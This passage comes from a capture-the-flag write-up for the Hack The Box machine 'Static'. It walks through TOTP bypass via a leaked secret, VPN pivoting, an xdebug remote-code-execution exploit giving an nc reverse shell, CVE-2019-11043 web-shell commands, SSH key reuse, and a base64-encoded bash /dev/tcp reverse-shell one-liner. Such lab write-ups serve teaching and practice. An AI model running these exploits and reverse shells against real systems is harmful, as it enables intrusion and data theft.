</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">CREATE</span><span class="mtk1"> </span><span class="mtk5">DATABASE</span><span class="mtk1"> </span><span class="mtk8">static</span><span class="mtk1">;</span>
<span class="mtk5">USE</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1">;</span>
<span class="mtk5">CREATE</span><span class="mtk1"> </span><span class="mtk5">TABLE</span><span class="mtk1"> </span><span class="mtk8">users</span><span class="mtk1"> ( id </span><span class="mtk7 mtki">smallint</span><span class="mtk1"> unsigned </span><span class="mtk5">not null</span><span class="mtk1"> auto_increment, username </span><span class="mtk7 mtki">varchar</span><span class="mtk1">(</span><span class="mtk6">20</span><span class="mtk1">) </span><span class="mtk5">not null</span><span class="mtk1">, </span><span class="mtk5">password</span><span class="mtk1"> </span><span class="mtk7 mtki">varchar</span><span class="mtk1">(</span><span class="mtk6">40</span><span class="mtk1">) </span><span class="mtk5">not null</span><span class="mtk1">, totp </span><span class="mtk7 mtki">varchar</span><span class="mtk1">(</span><span class="mtk6">16</span><span class="mtk1">) </span><span class="mtk5">not null</span><span class="mtk1">, </span><span class="mtk5">primary key</span><span class="mtk1"> (id) );</span>  
<span class="mtk5">INSERT INTO</span><span class="mtk1"> users ( id, username, </span><span class="mtk5">password</span><span class="mtk1">, totp ) </span><span class="mtk5">VALUES</span><span class="mtk1"> ( </span><span class="mtk5">null</span><span class="mtk1">, </span><span class="mtk4">'admin'</span><span class="mtk1">, </span><span class="mtk4">'d033e22ae348aeb5660fc2140aec35850c4da997'</span><span class="mtk1">, </span><span class="mtk4">'orxxi4c7orxwwzlo'</span><span class="mtk1"> );</span>
</code></pre></div><p>This SQL file creates a table called <code>users</code> with fields <code>id</code>, <code>username</code>, <code>password</code> and <code>totp</code>. And then a new user is inserted with name <code>admin</code>. Though the password is a hash, if we crack it we will get <code>admin</code> (something that we already know). The other value is <code>orxxi4c7orxwwzlo</code> for <code>totp</code>.</p><h3 id="handling-2fa">Handling 2FA</h3><p>This value for <code>totp</code> corresponds to the key used for the TOTP (Time-based One-Time Password) algorithm. The TOTP algorithm is implemented in Python and Ruby libraries (among others); there are also apps like Google Authenticator or online solutions.</p><p>Since I decided to use Ruby this time, let&rsquo;s do this TOTP stuff with Ruby. First, we must install <code>rotp</code> with <code>gem install rotp</code>. And then, from <code>irb</code> (interactive Ruby) we can get the code:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">irb</span>
irb(main):001:0&gt; require <span class="code-red">'</span><span class="code-dark-red">rotp</span><span class="code-red">'</span>
=&gt; <span class="code-cyan">true</span>
irb(main):002:0&gt; totp = <span class="code-blue mtku">ROTP</span>::<span class="code-blue mtku">TOTP</span>.new(<span class="code-red">'</span><span class="code-dark-red">orxxi4c7orxwwzlo</span><span class="code-red">'</span>)
=&gt; <span class="code-dark-green">#&lt;ROTP::TOTP:0x0000000147827380</span> @digest<span class="code-dark-green">=</span><span class="code-red">"</span><span class="code-dark-red">sha1</span><span class="code-red">"</span>, @digits<span class="code-dark-green">=</span><span class="code-blue">6</span>, @interval<span class="code-dark-green">=</span><span class="code-blue">30</span>, @issuer<span class="code-dark-green">=</span><span class="code-cyan">nil</span>, @secret<span class="code-dark-green">=</span><span class="code-red">"</span><span class="code-dark-red">orxxi4c7orxwwzlo</span><span class="code-red">"</span><span class="code-dark-green">&gt;</span>  
irb(main):003:0&gt; totp.now
=&gt; <span class="code-red">"</span><span class="code-dark-red">309130</span><span class="code-red">"</span>
irb(main):004:0&gt; totp.now
=&gt; <span class="code-red">"</span><span class="code-dark-red">860691</span><span class="code-red">"</span>
</code></pre></div><p>Unfortunately, these codes do not work. I tried other solutions, but the codes were the same, so the problem was not in Ruby.</p><p>Then, I figured out that since it is a Time-based OTP, I needed to have the same date as the machine. One can get the server&rsquo;s current date in the HTTP response headers if it is enabled. For example:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.10.246:8080 -I
HTTP/1.1 200 OK
<span class="code-white">Date</span>: Fri, 10 Dec 2021 22:22:22 GMT
<span class="code-white">Server</span>: Apache/2.4.38 (Debian)
<span class="code-white">Content-Type</span>: text/html; charset=UTF-8  
</code></pre></div><p>Then, we can add this date to the Ruby command and get a valid TOTP:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"></span>irb(main):005:0&gt; require <span class="code-red">'</span><span class="code-dark-red">time</span><span class="code-red">'</span>
=&gt; <span class="code-cyan">true</span>
irb(main):006:0&gt; date = <span class="code-blue mtku">Time</span>.parse(<span class="code-red">'</span><span class="code-dark-red">Fri, 10 Dec 2021 22:22:22 GMT</span><span class="code-red">'</span>).to_i  
=&gt; <span class="code-blue">1639174942</span>
irb(main):007:0&gt; totp.at(date)
=&gt; <span class="code-red">"</span><span class="code-dark-red">626733<span class="code-red">"</span>
</code></pre></div><p>During the attempts, I tried to add the TOTP calculation and the login process (using <code>admin:admin</code>) in the Ruby script to check if it was a timing issue. As a result, I had the login process programmed, and when I found the issue, I did have a working script to login as <code>admin</code> with these lines of code:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">require</span><span class="mtk1"> </span><span class="mtk4">'rotp'</span>
<span class="mtk5">require</span><span class="mtk1"> </span><span class="mtk4">'time'</span>
<span class="mtk5">require</span><span class="mtk1"> </span><span class="mtk4">'uri'</span>

<span class="mtk5">require</span><span class="mtk1"> </span><span class="mtk4">'net/http'</span>

<span class="mtk1">host </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'10.10.10.246:8080'</span>
<span class="mtk1">totp </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'orxxi4c7orxwwzlo'</span>

<span class="mtk1">url </span><span class="mtk5">=</span><span class="mtk1"> URI(</span><span class="mtk4">"</span><span class="mtk4 detected-link">http://</span><span class="mtk5 detected-link">#{</span><span class="mtk1 detected-link">host</span><span class="mtk5 detected-link">}</span><span class="mtk4 detected-link">/vpn/login.php</span><span class="mtk4">"</span><span class="mtk1">)</span>
<span class="mtk1">res </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">Net</span><span class="mtk1">::</span><span class="mtk7 mtki">HTTP</span><span class="mtk1">.</span><span class="mtk8">post</span><span class="mtk1">(url, </span><span class="mtk4">'username=admin&amp;password=admin&amp;submit=Login'</span><span class="mtk1">)</span>  
<span class="mtk1">cookie </span><span class="mtk5">=</span><span class="mtk1"> res[</span><span class="mtk4">'Set-Cookie'</span><span class="mtk1">]</span>
<span class="mtk1">server_time </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">Time</span><span class="mtk1">.</span><span class="mtk8">parse</span><span class="mtk1">(res[</span><span class="mtk4">'Date'</span><span class="mtk1">]).</span><span class="mtk8">to_i</span>
<span class="mtk7">puts</span><span class="mtk1"> </span><span class="mtk4">'[+] Login successful'</span>

<span class="mtk1">code </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">ROTP</span><span class="mtk1">::</span><span class="mtk7 mtki">TOTP</span><span class="mtk1">.</span><span class="mtk5">new</span><span class="mtk1">(totp).</span><span class="mtk8">at</span><span class="mtk1">(server_time)</span>
<span class="mtk7">puts</span><span class="mtk1"> </span><span class="mtk4">"[*] Generating TOTP code: </span><span class="mtk5">#{</span><span class="mtk1">code</span><span class="mtk5">}</span><span class="mtk4">"</span>

<span class="mtk1">res </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">Net</span><span class="mtk1">::</span><span class="mtk7 mtki">HTTP</span><span class="mtk1">.</span><span class="mtk8">post</span><span class="mtk1">(url, </span><span class="mtk4">"code=</span><span class="mtk5">#{</span><span class="mtk1">code</span><span class="mtk5">}</span><span class="mtk4">"</span><span class="mtk1">, { </span><span class="mtk6">Cookie:</span><span class="mtk1"> cookie })</span>
<span class="mtk1">location </span><span class="mtk5">=</span><span class="mtk1"> res[</span><span class="mtk4">'Location'</span><span class="mtk1">]</span>

<span class="mtk7">puts</span><span class="mtk1"> </span><span class="mtk4">"[+] 2FA successful. Go to </span><span class="mtk4 detected-link">http://</span><span class="mtk5 detected-link">#{</span><span class="mtk1 detected-link">host</span><span class="mtk5 detected-link">}</span><span class="mtk4 detected-link">/vpn/</span><span class="mtk5 detected-link">#{</span><span class="mtk1 detected-link">location</span><span class="mtk5 detected-link">}</span><span class="mtk4">"</span>
<span class="mtk7">puts</span><span class="mtk1"> </span><span class="mtk4">"[+] Cookie: </span><span class="mtk5">#{</span><span class="mtk1">cookie</span><span class="mtk5">}</span><span class="mtk4">"</span>
</code></pre></div><p>The script returns the URL where to go (since the server applies a redirection) and the cookie to keep authenticated:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ruby</span> <span class="mtku">login_2fa.rb</span>
[+] Login successful
[*] Generating TOTP code: 508175
[+] 2FA successful. Go to http://10.10.10.246:8080/vpn/panel.php  
[+] Cookie: PHPSESSID=1l5prlovq3bek3488ehmi03koj; path=/
</code></pre></div><h2 id="foothold">Foothold</h2><p>We can see a panel like this:</p><p><img src="/images/HTB/Static/Static-portal.png" alt="Static Panel"></p><p>Here we can download a VPN as an <code>.ovpn</code> file (like the one used to connect to Hack The Box machines). We also see that there are some machines that should be accessible using the VPN.</p><p>Just to complete the Ruby script, I decided to put everything together. As a result, the script downloads and patches the Gzip file, extracts the TOTP key from the SQL contents, does the login and 2FA and finally downloads the VPN file as <code>static.ovpn</code>. This script is called <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Static/get_vpn.rb"><code>get_vpn.rb</code></a> (detailed explanation <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Static#get_vpnrb">here</a>).</p><h3 id="connection-to-static-vpn">Connection to Static VPN</h3><p>If we simply run <code>openvpn static.ovpn</code>, we will see some errors. The problem is that the file contains a subdomain called <code>vpn.static.htb</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">head</span> <span class="mtku">static.ovpn</span>
client
dev tun9
proto udp
remote vpn.static.htb 1194  
resolv-retry infinite
nobind
user nobody
group nogroup
persist-key
persist-tun
</code></pre></div><p>Thus, we need to add the subdomain to <code>/etc/hosts</code>. After that, the VPN connection works properly and we are assigned IP address <code>172.30.0.9</code>.</p><p>However, we do have no connection to the online IP address listed in the previous portal. We can fix this adding routes manually:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">route</span> add -net 172.20.0.0 172.30.0.1 255.255.255.0
add net 172.20.0.0: gateway 172.30.0.1

<span class="code-red">#</span> <span class="code-dark-green">ping</span> -c 1 172.20.0.10
PING 172.20.0.10 (172.20.0.10): 56 data bytes
64 bytes from 172.20.0.10: icmp_seq=0 ttl=63 time=49.962 ms

--- 172.20.0.10 ping statistics ---
1 packets transmitted, 1 packets received, 0.0% packet loss
round-trip min/avg/max/stddev = 49.962/49.962/49.962/0.000 ms  

<span class="code-red">#</span> <span class="code-dark-green">ping</span> -c 1 172.20.0.11
PING 172.20.0.11 (172.20.0.11): 56 data bytes
64 bytes from 172.20.0.11: icmp_seq=0 ttl=63 time=43.332 ms

--- 172.20.0.11 ping statistics ---
1 packets transmitted, 1 packets received, 0.0% packet loss
round-trip min/avg/max/stddev = 43.332/43.332/43.332/0.000 ms
</code></pre></div><h3 id="exploiting-an-internal-server">Exploiting an internal server</h3><p>After a simple <code>nmap</code> scan for <code>172.20.0.10</code>, we see that it is a web server:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">nmap</span> -sS -p- -Pn -n 172.20.0.10
Starting Nmap 7.93 ( https://nmap.org )
Nmap scan report for 172.20.0.10
Host is up (0.059s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 57.40 seconds  
</code></pre></div><p>This server shows the following directory listing:</p><p><img src="/images/HTB/Static/Static-web-index.png" alt="Static web internal server"></p><p>The directory <code>vpn</code> is the same as before, so it is not interesting.</p><p>The file <code>info.php</code> shows a common <code>phpinfo()</code> with all the PHP configuration. After reading all the information, we discover that <code>xdebug</code> is enabled:</p><p><img src="/images/HTB/Static/Static-xdebug.png" alt="Static web internal xdebug"></p><p>This is a problem because we can connect to the server for &ldquo;debugging&rdquo; reasons and gain Remote Code Execution (RCE). Looking for exploits, we can find <a href="https://github.com/gteissier/xdebug-shell">this one</a> made in Python version 2. This exploit works and returns an interactive command shell.</p><p>I decided to translate it to Python version 3 and fix it in order to obtain a common reverse shell with <code>nc</code>. The resulting exploit can be found here: <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Static/xdebug_shell.py"><code>xdebug_shell.py</code></a> (detailed explanation <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Static#xdebug_shellpy">here</a>).</p><p>We can use the exploit to gain access tho the internal web server (remember to use the Static VPN IP address and not the Hack The Box one):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">xdebug_shell.py</span> http://172.20.0.10/info.php 172.30.0.9 4444  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.30.0.1.
Ncat: Connection from 172.30.0.1:52634.
bash: cannot set terminal process group (37): Inappropriate ioctl for device  
bash: no job control in this shell
www-data@web:/var/www/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@web:/var/www/html$ ^Z
zsh: suspended  ncat -nlvp 4444

<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
[1]  + continued  ncat -nlvp 4444
                                 reset xterm
www-data@web:/var/www/html$ export TERM=xterm
www-data@web:/var/www/html$ export SHELL=bash
www-data@web:/var/www/html$ stty rows 50 columns 158
</code></pre></div><p>Here we can find <code>user.txt</code> flag:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@web:/var/www/html$ ls -la
total 16
drwxr-xr-x 3 root root 4096 Apr  6  2020 .
drwxr-xr-x 3 root root 4096 Jun 14  2021 ..
-rw-r--r-- 1 root root   19 Apr  3  2020 info.php  
drwxr-xr-x 3 root root 4096 Jun 17  2020 vpn
www-data@web:/var/www/html$ ls /home
user.txt  www-data
www-data@web:/var/www/html$ cat /home/user.txt
c3f343befcac5fa92fb5373456e94247
</code></pre></div><p>Moreover, we have an <code>id_rsa</code> for user <code>www-data</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@web:/var/www/html$ ls -la /home/www-data
total 16
drwxr-x--- 4 www-data www-data 4096 Jun 14  2021 .
drwxr-xr-x 3 root     root     4096 Jun 14  2021 ..
lrwxrwxrwx 1 root     root        9 Jun 14  2021 .bash_history -&gt; /dev/null  
drwx------ 2 www-data www-data 4096 Jun 14  2021 .cache
drwx------ 2 www-data www-data 4096 Jun 14  2021 .ssh
www-data@web:/var/www/html$ ls -la /home/www-data/.ssh
total 20
drwx------ 2 www-data www-data 4096 Jun 14  2021 .
drwxr-x--- 4 www-data www-data 4096 Jun 14  2021 ..
-rw-r--r-- 1 www-data www-data  390 Jun 14  2021 authorized_keys
-rw------- 1 www-data www-data 1675 Jun 14  2021 id_rsa
-rw-r--r-- 1 www-data www-data  390 Jun 14  2021 id_rsa.pub
</code></pre></div><p>Then, we can copy or transfer the <code>id_rsa</code> file and connect via SSH. We can access through IP address 172.20.0.10:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> -i <span class="mtku">id_rsa</span> www-data@172.20.0.10  
www-data@web:~$
</code></pre></div><p>But also through IP address 10.10.10.246 and port 2222 (recall that there were two SSH services running):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> -i <span class="mtku">id_rsa</span> www-data@10.10.10.246 -p 2222  
www-data@web:~$
</code></pre></div><h2 id="network-enumeration">Network enumeration</h2><p>Let&rsquo;s see what network interfaces we have:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@web:~$ ifconfig
eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 172.20.0.10  netmask 255.255.255.0  broadcast 172.20.0.255
        ether 02:42:ac:14:00:0a  txqueuelen 0  (Ethernet)
        RX packets 286733  bytes 62939217 (62.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 284115  bytes 109282923 (109.2 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 192.168.254.2  netmask 255.255.255.0  broadcast 192.168.254.255  
        ether 02:42:c0:a8:fe:02  txqueuelen 0  (Ethernet)
        RX packets 16555  bytes 3910920 (3.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 23781  bytes 10145337 (10.1 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 576  bytes 38947 (38.9 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 576  bytes 38947 (38.9 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</code></pre></div><p>So we have the following network setup:</p><p><img src="/images/HTB/Static/Static-network.png" alt="Network diagram"></p><p>We can connect to the <code>pki</code>, which has IP address <code>192.168.254.3</code>. To perform a port scan we can use <code>nmap</code> and <code>proxychains</code> after configuring SSH dynamic port forwarding:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> -fND 9050 -i <span class="mtku">id_rsa</span> www-data@10.10.10.246 -p 2222  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">proxychains4</span> -q nmap -sS -p- -vvv -Pn -n 192.168.254.3
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.  
Starting Nmap 7.93 ( https://nmap.org )
Initiating SYN Stealth Scan
Scanning 192.168.254.3 [65535 ports]
SYN Stealth Scan Timing: About 0.30% done
Stats: 0:01:43 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 0.39% done
Stats: 0:02:12 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 0.50% done
^C
</code></pre></div><p>The idea was nice, but the port scan took ages and <code>nmap</code> with <code>proxychains</code> does not work well sometimes (it might report false positives or not report open ports).</p><p>Let&rsquo;s use a simple Bash script and execute it from the <code>web</code> machine to get less latency:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/env bash</span>

<span class="mtk5">for</span><span class="mtk1"> p </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk4">`seq 1 65535`</span><span class="mtk5">;</span><span class="mtk1"> </span><span class="mtk5">do</span>
<span class="mtk1">  </span><span class="mtk7">echo</span><span class="mtk1"> -ne </span><span class="mtk4">"Trying </span><span class="mtk1">$p</span><span class="mtk4">\r"</span>
<span class="mtk1">  timeout 1 </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk5">2&gt;</span><span class="mtk1">/dev/null </span><span class="mtk5">&gt;</span><span class="mtk1"> /dev/tcp/192.168.254.3/$p </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"Port: </span><span class="mtk1">$p</span><span class="mtk4"> OPEN"</span><span class="mtk1"> </span><span class="mtk5">&amp;</span>  
<span class="mtk5">done;</span><span class="mtk1"> </span><span class="mtk7">wait</span>
</code></pre></div><p>We can transfer the script using a Python web server and <code>wget</code>, since the machine does not have <code>vim</code> or <code>nano</code>.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@web:~$ cd /tmp
www-data@web:/tmp$ wget 172.30.0.9/port_scan.sh  
www-data@web:/tmp$ bash port_scan.sh
Port: 80 OPEN
</code></pre></div><p>In less than 5 minutes we have all the results. Only port 80 (HTTP) is open on <code>pki</code>, which will appear after a few seconds as a result of the scan.</p><p>Let&rsquo;s do a local port forwarding using SSH (use <code>ENTER</code> + <code>~C</code> to exit temporarily from the current SSH session and get the <code>ssh></code> prompt):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@web:/tmp$
ssh&gt; -L 8080:192.168.254.3:80  
Forwarding port.

www-data@web:/tmp$
</code></pre></div><p>We have the following HTTP response from <code>pki</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 127.0.0.1:8080 -i
HTTP/1.1 200 OK
<span class="code-white">Server</span>: nginx/1.14.0 (Ubuntu)
<span class="code-white">Date</span>: Wed, 11 Jan 2023 00:04:20 GMT
<span class="code-white">Content-Type</span>: text/html; charset=UTF-8
<span class="code-white">Transfer-Encoding</span>: chunked
<span class="code-white">Connection</span>: keep-alive
<span class="code-white">X-Powered-By</span>: PHP-FPM/7.1

batch mode: /usr/bin/ersatool create|print|revoke CN  
</code></pre></div><p>The response is weird because it is showing like a &ldquo;help panel&rdquo; from a binary file called <code>ersatool</code>. Let&rsquo;s apply some fuzzing and discover more routes:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/dirb/common.txt -u http://127.0.0.1:8080/FUZZ
<span class="code-dark-green">                        [Status: 200, Size: 53, Words: 5, Lines: 2, Duration: 164ms]</span>
<span class="code-dark-green">index.php               [Status: 200, Size: 53, Words: 5, Lines: 2, Duration: 48ms]</span>
<span class="code-dark-blue">uploads                 [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 112ms]  
</code></pre></div><p>There is an <code>/uploads</code> folder, but directory listing is disabled.</p><h2 id="exploiting-another-internal-server">Exploiting another internal server</h2><p>From the HTTP response headers shown before, we get that the server is running PHP-FPM/7.1. There is an exploit for this technology, show-cased <a href="https://github.com/neex/phuip-fpizdam">here</a> (CVE-2019-11043).</p><p>The exploit consists of a Go project that exposes a web-shell on the victim. Let&rsquo;s build the project:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">git</span> clone https://github.com/neex/phuip-fpizdam  

<span class="code-cyan">$</span> <span class="code-dark-green">cd</span> <span class="mtku">phuip-fpizdam</span>

<span class="code-cyan">$</span> <span class="code-dark-green">go</span> build --ldflags=<span class="code-dark-yellow">'-s -w'</span> <span class="mtku">.</span>
go: downloading github.com/spf13/cobra v0.0.5
go: downloading github.com/spf13/pflag v1.0.3

<span class="code-cyan">$</span> <span class="code-dark-green">upx</span> <span class="mtku">phuip-fpizdam</span>
</code></pre></div><p>After reading the basic information about the exploit, we can execute it like this:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./phuip-fpizdam</span> http://127.0.0.1:8080/index.php
Base status code is 200
Status code 502 for qsl=1765, adding as a candidate
The target is probably vulnerable. Possible QSLs: [1755 1760 1765]
Attack params found: --qsl 1755 --pisos 38 --skip-detect
Trying to set "session.auto_start=0"...
Detect() returned attack params: --qsl 1755 --pisos 38 --skip-detect &lt;-- REMEMBER THIS
Performing attack using php.ini settings...
Success! Was able to execute a command by appending "?a=/bin/sh+-c+'which+which'&" to URLs  
Trying to cleanup /tmp/a...
Done!
</code></pre></div><p>And as it says in the output, we have now a query parameter where to put our system commands:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">"127.0.0.1:8080/index.php?a=/bin/sh+-c+'which+which'&"</span>
/usr/bin/which
&lt;br /&gt;
&lt;b&gt;Warning&lt;/b&gt;:  Cannot modify header information - headers already sent by (output started at /tmp/a:1) in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;2&lt;/b&gt;&lt;br  
 /&gt;
batch mode: /usr/bin/ersatool create|print|revoke CN
</code></pre></div><p>One thing to notice is that the command does not always work. We need to send the request around three or four times to execute the command.</p><p>Using this RCE, we can make some basic enumeration of the system:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">"127.0.0.1:8080/index.php?a=/bin/sh+-c+'whoami'&"</span>
www-data
&lt;br /&gt;
&lt;b&gt;Warning&lt;/b&gt;:  Cannot modify header information - headers already sent by (output started at /tmp/a:1) in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;2&lt;/b&gt;&lt;br
 /&gt;
batch mode: /usr/bin/ersatool create|print|revoke CN

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">"127.0.0.1:8080/index.php?a=/bin/sh+-c+'ls+-la'&"</span>
total 16
drwxr-xr-x 3 root     root     4096 Apr  4  2020 .
drwxr-xr-x 3 root     root     4096 Mar 27  2020 ..
-rw-r--r-- 1 root     root      174 Apr  4  2020 index.php
drwxr-xr-x 2 www-data www-data 4096 Mar 27  2020 uploads
&lt;br /&gt;
&lt;b&gt;Warning&lt;/b&gt;:  Cannot modify header information - headers already sent by (output started at /tmp/a:1) in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;2&lt;/b&gt;&lt;br /&gt;  
batch mode: /usr/bin/ersatool create|print|revoke CN
</code></pre></div><p>However, it will be more useful to have a proper command shell. For this, I decided to add a PHP file into <code>/uploads</code> with a system command that sends a reverse shell.</p><p>Notice that <code>pki</code> does not have connectivity to the attacker machine. Hence, the reverse shell will be sent to <code>web</code> (<code>192.168.254.2</code>). Once in <code>web</code>, the traffic will be redirected to the attacker machine (<code>172.30.0.9</code>) using port forwarding with <a href="https://github.com/jpillora/chisel"><code>chisel</code></a>.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> -n <span class="code-dark-yellow">'bash  -i &gt;& /dev/tcp/192.168.254.2/4444  0&gt;&1'</span> | <span class="code-dark-green">base64</span>  
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yNTQuMi80NDQ0ICAwPiYx
